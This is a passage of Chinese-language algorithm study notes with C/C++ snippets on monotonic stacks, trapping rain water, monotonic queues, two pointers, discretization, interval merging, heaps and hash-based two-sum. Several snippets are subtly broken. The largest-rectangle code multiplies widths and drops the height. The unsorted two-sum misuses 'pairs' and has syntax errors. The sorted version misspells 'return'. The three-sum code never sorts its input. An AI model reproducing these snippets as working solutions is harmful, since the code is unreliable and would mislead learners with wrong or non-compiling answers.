class="hljs-type">int</span> accmulatedWidth = <span class="hljs-number">0</span>;<br>            <span class="hljs-comment">// 如果当前柱子的高度小于栈顶柱子的高度，则计算面积</span><br>            <span class="hljs-keyword">while</span> (!s.empty() &amp;&amp; s.top().height &gt;= height) &#123;<br>                accmulatedWidth += s.top().width;<br>                res = max(ans,s.top().width*accmulatedWidth);            <br>                s.pop();            <br>        &#125;<br>        s.push(&#123;accmulatedWidth+<span class="hljs-number">1</span>,height&#125;);  <span class="hljs-comment">// 将当前柱子的索引压入栈</span><br>   &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="接雨水"><a href="#接雨水" class="headerlink" title="接雨水"></a>接雨水</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><br>private:<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">UERT</span>&#123;</span><br><span class="hljs-type">int</span> width;<br><span class="hljs-type">int</span> height;<br>&#125;;<br><span class="hljs-built_in">stack</span> &lt;UERT&gt; s;<br>public:<br><span class="hljs-type">int</span> <span class="hljs-title function_">trap</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; heights)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> height:heights) &#123;<br>            <span class="hljs-type">int</span> accmulatedWidth = <span class="hljs-number">0</span>;<br>            <span class="hljs-comment">// 如果当前柱子的高度大于栈顶柱子，计算能存储的雨水</span><br>            <span class="hljs-keyword">while</span> (!s.empty() &amp;&amp; s.top().height &lt;= height) &#123;<br>                <span class="hljs-type">int</span> bottom = s.top().height;<br>                accmulatedWidth += s.top().width;<br>                s.pop();<br>                <span class="hljs-keyword">if</span> (s.empty()) <span class="hljs-keyword">continue</span>;  <span class="hljs-comment">// 如果栈为空，跳过,水从左边溜走了</span><br>                <span class="hljs-type">int</span> up = min(height,s.top().height);<br>                ans += accmulatedWidth*(up-bottom);<br>            &#125;<br>            s.push(&#123;accmulatedWidth+<span class="hljs-number">1</span>,height&#125;);  <span class="hljs-comment">// 将当前柱子的索引压入栈</span><br>        &#125;<br><br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br>前缀和思想<br><span class="hljs-type">int</span> <span class="hljs-title function_">trap</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; heights)</span> &#123;<br>    <span class="hljs-type">int</span> n = heights.size();<br>    preMax = <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(n);<br>    sufMax = <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(n);<br>    <br>    <span class="hljs-comment">// 预处理preMax数组</span><br>    preMax[<span class="hljs-number">0</span>] = heights[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++) &#123;<br>        preMax[i] = max(preMax[i - <span class="hljs-number">1</span>], heights[i]);<br>    &#125;<br><br>    <span class="hljs-comment">// 预处理sufMax数组</span><br>    sufMax[n - <span class="hljs-number">1</span>] = heights[n - <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n - <span class="hljs-number">2</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        sufMax[i] = max(sufMax[i + <span class="hljs-number">1</span>], heights[i]);<br>    &#125;<br><br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; n - <span class="hljs-number">1</span>; i++) &#123;<br>        <span class="hljs-type">int</span> up = min(preMax[i - <span class="hljs-number">1</span>], sufMax[i + <span class="hljs-number">1</span>]);<br>        <span class="hljs-type">int</span> bottom = heights[i];<br>        <span class="hljs-keyword">if</span> (up &gt; bottom) &#123;<br>            ans += up - bottom;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br>preMax[]：记录当前位置左侧的最大高度。<br>sufMax[]：记录当前位置右侧的最大高度。<br></code></pre></td></tr></table></figure><p>+++++</p><h2 id="八-队列和双指针"><a href="#八-队列和双指针" class="headerlink" title="八.队列和双指针"></a>八.队列和双指针</h2><p>模拟队列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// hh 表示队头，tt表示队尾</span><br><span class="hljs-type">int</span> q[N], hh = <span class="hljs-number">0</span>, tt = <span class="hljs-number">-1</span>;<br><span class="hljs-comment">// 向队尾插入一个数</span><br>q[ ++ tt] = x;<br><span class="hljs-comment">// 从队头弹出一个数</span><br>hh ++ ;<br><span class="hljs-comment">// 队头的值</span><br>q[hh];<br><span class="hljs-comment">// 判断队列是否为空</span><br><span class="hljs-keyword">if</span> (hh &lt;= tt)<br>&#123;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="单调队列"><a href="#单调队列" class="headerlink" title="单调队列"></a>单调队列</h3><p>我们就希望去维护一个这样的候选,集合里边的元素，它们的值是递减的。所以当I它大于等于k-1时，我已经攒够了。q的值是递减的呀，可能成为一个答案的选项，那么此时就对头最好，我就取对头作为答案。这就是我们要干三件事情。</p><p>单调队列维护的是一个候选集合，前面的比较旧，后面的比较新(时间有单调性</p><p>候选项的某个属性也具有单调性</p><p>确定递增递减的方法–考虑任意两个候选顶j&lt;j2，写出j比优的条件</p><p>排除冗余的关键:若j比j差，j的生命周期还比了短，那了 就没卵用了</p><p>单调队列题目代码套路:<br>·for 每个元素<br>    (1)while(队头过期)队头出队<br>    (2)取队头为最佳选项，计算答案                                                                                                                                            (3)while(队尾与新元素不满足单调性)队尾出队                                                                                                                                                                                                                                                        (3)新元素入队</p><h3 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h3><h4 id="找到滑动窗口最大值"><a href="#找到滑动窗口最大值" class="headerlink" title="找到滑动窗口最大值"></a>找到滑动窗口最大值</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br>public:<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">maxSlidingWindow</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> k)</span> &#123;<br>        <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; ans; <span class="hljs-comment">// 存储结果</span><br>        <span class="hljs-built_in">deque</span>&lt;<span class="hljs-type">int</span>&gt; q; <span class="hljs-comment">// 用于维护滑动窗口的双端队列</span><br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.size(); i++) &#123;<br>            <span class="hljs-comment">// 删除过期元素：如果队首元素不在当前窗口范围内，则弹出队首</span><br>            <span class="hljs-keyword">while</span> (!q.empty() &amp;&amp; q.front() &lt;= i - k) &#123;<br>                q.pop_front();<br>            &#125;<br><br>            <span class="hljs-comment">// 插入新元素：移除队列中所有小于当前元素的值，以保持递减顺序</span><br>            <span class="hljs-keyword">while</span> (!q.empty() &amp;&amp; nums[q.back()] &lt;= nums[i]) &#123;<br>                q.pop_back();<br>            &#125;<br><br>            <span class="hljs-comment">// 将当前元素的索引加入到队列中</span><br>            q.push_back(i);<br><br>            <span class="hljs-comment">// 记录当前窗口的最大值：队首元素即为窗口内的最大值</span><br>            <span class="hljs-keyword">if</span> (i &gt;= k - <span class="hljs-number">1</span>) &#123;<br>                ans.push_back(nums[q.front()]);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h3 id="二维单调队列"><a href="#二维单调队列" class="headerlink" title="二维单调队列"></a>二维单调队列</h3><h3 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h3><p><strong>定义</strong>：通过一左一右或一前一后两个指针逼近来找到符合条件的解</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcode">for<span class="hljs-comment">(i=0,j=0;i&lt;n;i++)</span>&#123;<br><span class="hljs-keyword">while</span> <span class="hljs-comment">(j&lt;i&amp;&amp;check(i,j)</span>)j++;<br><span class="hljs-comment">//每道题目的具体逻辑</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="例子-4"><a href="#例子-4" class="headerlink" title="例子"></a>例子</h4><h5 id="两数之和："><a href="#两数之和：" class="headerlink" title="两数之和："></a>两数之和：</h5><p>给定一个有序数组，找到两个数，使得它们的和等于目标值 <code>target</code>。返回这两个数的下标，假定数组内没有重复解。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp">输入有序<br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">twoSum</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; numbers, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>    <span class="hljs-type">int</span> j = numbers.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;  <span class="hljs-comment">// 两个指针从数组两端开始</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;numbers.<span class="hljs-built_in">size</span>(); i++)&#123;<br>        <span class="hljs-keyword">while</span>(i&lt;j &amp;&amp; numbers[i]+numbers[j]&gt;target)j--;<br>        <span class="hljs-keyword">if</span> (i&lt;j &amp;&amp; numbers[i] + numbers[j] == target) &#123;<br>            reture &#123;i<span class="hljs-number">+1</span>,j<span class="hljs-number">+1</span>&#125;<br>        &#125;   <br>    &#125;<br>    <span class="hljs-keyword">return</span> &#123;&#125;;  <span class="hljs-comment">// 未找到目标值，返回空结果</span><br>&#125;<br><br>输入无序<br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">twoSum</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; numbers, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>    vector&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt; pairs;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;numbers.<span class="hljs-built_in">size</span>(); i++)&#123;<br>        pairs.<span class="hljs-built_in">push</span>(&#123;num[i],i&#125;);  <br>    &#125;<br>    <span class="hljs-built_in">sort</span>(pairs.<span class="hljs-built_in">begin</span>(),pairs.<span class="hljs-built_in">end</span>());<br>    <span class="hljs-type">int</span> j = pairs.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;pairs.<span class="hljs-built_in">size</span>(); i++)&#123;<br>        <span class="hljs-keyword">while</span>(i&lt;j &amp;&amp; pairs[i].first+pairs.first&gt;target)j--;<br>        <span class="hljs-keyword">if</span>(i&lt;j &amp;&amp; pairs[i].first+pairs.first==target)&#123;<br>            <span class="hljs-keyword">return</span> &#123;pairs[i],second , pairs[j].second&#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> &#123;&#125;;  <span class="hljs-comment">// 未找到目标值，返回空结果</span><br>&#125;  <br></code></pre></td></tr></table></figure><h5 id="三数之和："><a href="#三数之和：" class="headerlink" title="三数之和："></a>三数之和：</h5><p>给定一个数组 <code>nums</code>，找出其中的三个数，使得它们的和为 0。可以假设数组中没有重复解。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">threeSum</span>(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums) &#123;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; ans;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; jks = <span class="hljs-built_in">twoSum</span>(nums, i + <span class="hljs-number">1</span>, -nums[i]);<br>            <span class="hljs-keyword">for</span> (vector&lt;<span class="hljs-type">int</span>&gt;&amp; jk : jks) &#123;<br>                ans.<span class="hljs-built_in">push_back</span>(&#123;nums[i], jk[<span class="hljs-number">0</span>], jk[<span class="hljs-number">1</span>]&#125;);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br><br><span class="hljs-keyword">private</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">twoSum</span>(vector&lt;<span class="hljs-type">int</span>&gt;&amp; numbers, <span class="hljs-type">int</span> start, <span class="hljs-type">int</span> target) &#123;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; ans;<br>        <span class="hljs-type">int</span> j = numbers.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = start; i &lt; numbers.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            <span class="hljs-keyword">while</span> (i &lt; j &amp;&amp; numbers[i] + numbers[j] &gt; target) j--;<br>            <span class="hljs-keyword">if</span> (i &lt; j &amp;&amp; numbers[i] + numbers[j] == target) &#123;<br>                ans.<span class="hljs-built_in">push_back</span>(&#123;numbers[i], numbers[j]&#125;);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p><strong>优化与细节</strong>：</p><ul><li><strong>去重处理</strong>：为了避免重复解，固定数和双指针都需要跳过重复的元素。例如，固定数 <code>nums[i]</code> 相同的情况不再处理，双指针的 <code>nums[j]</code> 和 <code>nums[k]</code> 也需要处理重复的情况。</li><li><strong>时间复杂度</strong>：排序时间复杂度为 O(nlogn)，之后遍历和双指针查找的时间复杂度是 O(n²)，总体复杂度为 O(n²)。</li></ul><h5 id="盛水最多的容器："><a href="#盛水最多的容器：" class="headerlink" title="盛水最多的容器："></a>盛水最多的容器：</h5><p>给定一个数组 <code>height</code>，其中每个元素代表容器壁的高度，找到两个容器壁，使得它们与 X 轴构成的容器能盛最多的水。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxArea</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; height)</span> </span>&#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = height.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (i &lt; j) &#123;<br>        ans = <span class="hljs-built_in">max</span>(ans, <span class="hljs-built_in">min</span>(height[i], height[j]) * (j - i));<br>        <span class="hljs-keyword">if</span> (height[i] &lt; height[j]) i++;<br>        <span class="hljs-keyword">else</span> j--;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="离散化问题"><a href="#离散化问题" class="headerlink" title="离散化问题"></a>离散化问题</h3><p>将一个区间内的连续的、可能是非常大的数值范围（例如整数或浮点数）映射到一个较小的、连续的整数区间   数据范围在十的九次方左右</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; alls; <span class="hljs-comment">// 存储所有待离散化的值</span><br>sort(alls.begin(), alls.end()); <span class="hljs-comment">// 将所有值排序</span><br>alls.erase(unique(alls.begin(), alls.end()), alls.end());   <span class="hljs-comment">// 去掉重复元素</span><br><br><span class="hljs-comment">// 二分求出x对应的离散化的值</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> <span class="hljs-comment">// 找到第一个大于等于x的位置</span><br>&#123;<br>    <span class="hljs-type">int</span> l = <span class="hljs-number">0</span>, r = alls.size() - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (l &lt; r)<br>    &#123;<br>        <span class="hljs-type">int</span> mid = l + r &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (alls[mid] &gt;= x) r = mid;<br>        <span class="hljs-keyword">else</span> l = mid + <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> r + <span class="hljs-number">1</span>; <span class="hljs-comment">// 映射到1, 2, ...n</span><br>&#125;<br><br>find调用后返回新数组的下标<br></code></pre></td></tr></table></figure><h3 id="区间合并问题"><a href="#区间合并问题" class="headerlink" title="区间合并问题"></a>区间合并问题</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">merge</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;PII&gt; &amp;segs)</span><br>&#123;<br>    <span class="hljs-built_in">vector</span>&lt;PII&gt; res;<br><br>    sort(segs.begin(), segs.end());<br><br>    <span class="hljs-type">int</span> st = <span class="hljs-number">-2e9</span>, ed = <span class="hljs-number">-2e9</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> seg : segs)&#123;<br>        <span class="hljs-keyword">if</span> (ed &lt; seg.first)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (st != <span class="hljs-number">-2e9</span>) res.push_back(&#123;st, ed&#125;);<br>            st = seg.first, ed = seg.second;<br>        &#125;<br>        <span class="hljs-keyword">else</span> ed = max(ed, seg.second);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (st != <span class="hljs-number">-2e9</span>) res.push_back(&#123;st, ed&#125;);<br><br>    segs = res;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="比较前缀和，差分，双指针，滑动窗口，单调栈各自适用的情况"><a href="#比较前缀和，差分，双指针，滑动窗口，单调栈各自适用的情况" class="headerlink" title="比较前缀和，差分，双指针，滑动窗口，单调栈各自适用的情况"></a>比较前缀和，差分，双指针，滑动窗口，单调栈各自适用的情况</h3><ol><li>前缀和（Prefix Sum）<br>适用情况：<br>快速计算数组某个子区间的和：适用于需要多次计算数组某个区间和的场景。<br>区间查询和更新较少：适合静态数组或查询操作远多于更新操作的情况。</li><li>差分（Difference Array）<br>适用情况：<br>快速进行区间修改：适用于需要频繁对数组某个区间进行加减操作的场景。<br>需要高效进行批量更新：适合大规模区间更新操作。</li><li>双指针（Two Pointers）<br>适用情况：<br>处理有序数组：适用于需要在有序数组或链表中查找、遍历等操作。<br>解决滑动窗口问题：适合在数组或字符串上维护动态区间的问题。</li><li>滑动窗口（Sliding Window）<br>适用情况：<br>子数组问题：适用于需要找到数组中满足特定条件的子数组或子字符串的问题。<br>连续子区间：适合处理需要计算连续子区间的问题。</li><li>单调栈（Monotonic Stack）<br>适用情况：<br>找到数组中每个元素的下一个更大（或更小）元素：适用于需要在数组中找到特定方向上的极值问题。<br>维护区间单调性：适合处理需要保持区间单调性的问题。</li></ol><hr><h2 id="九-优先列队-堆"><a href="#九-优先列队-堆" class="headerlink" title="九.优先列队&#x2F;堆"></a>九.优先列队&#x2F;堆</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// h[N]存储堆中的值, h[1]是堆顶，x的左儿子是2x, 右儿子是2x + 1</span><br><span class="hljs-comment">// ph[k]存储第k个插入的点在堆中的位置</span><br><span class="hljs-comment">// hp[k]存储堆中下标是k的点是第几个插入的</span><br><span class="hljs-type">int</span> h[N], ph[N], hp[N], size;<br><br><span class="hljs-comment">// 交换两个点，及其映射关系</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">heap_swap</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span><br>&#123;<br>    swap(ph[hp[a]],ph[hp[b]]);<br>    swap(hp[a], hp[b]);<br>    swap(h[a], h[b]);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">down</span><span class="hljs-params">(<span class="hljs-type">int</span> u)</span><br>&#123;<br>    <span class="hljs-type">int</span> t = u;<br>    <span class="hljs-keyword">if</span> (u * <span class="hljs-number">2</span> &lt;= size &amp;&amp; h[u * <span class="hljs-number">2</span>] &lt; h[t]) t = u * <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> (u * <span class="hljs-number">2</span> + <span class="hljs-number">1</span> &lt;= size &amp;&amp; h[u * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] &lt; h[t]) t = u * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (u != t)<br>    &#123;<br>        heap_swap(u, t);<br>        down(t);<br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">up</span><span class="hljs-params">(<span class="hljs-type">int</span> u)</span><br>&#123;<br>    <span class="hljs-keyword">while</span> (u / <span class="hljs-number">2</span> &amp;&amp; h[u] &lt; h[u / <span class="hljs-number">2</span>])<br>    &#123;<br>        heap_swap(u, u / <span class="hljs-number">2</span>);<br>        u &gt;&gt;= <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// O(n)建堆</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n / <span class="hljs-number">2</span>; i; i -- ) down(i);<br><br></code></pre></td></tr></table></figure><hr><h2 id="十-哈希表"><a href="#十-哈希表" class="headerlink" title="十. 哈希表"></a>十. 哈希表</h2><h3 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h3><h4 id="找到两数之和"><a href="#找到两数之和" class="headerlink" title="找到两数之和"></a>找到两数之和</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> nums[<span class="hljs-number">100005</span>]; <span class="hljs-comment">// 假设最多10^5个元素</span><br>unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; h;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">twoSum</span><span class="hljs-params">(<span class="hljs-type">int</span> n, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-keyword">if</span> (h.<span class="hljs-built_in">find</span>(target - nums[i]) != h.<span class="hljs-built_in">end</span>()) &#123;<br>            cout &lt;&lt; h[target - nums[i]] &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        h[nums[i]] = i;<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;-1 -1\n&quot;</span>; <span class="hljs-comment">// 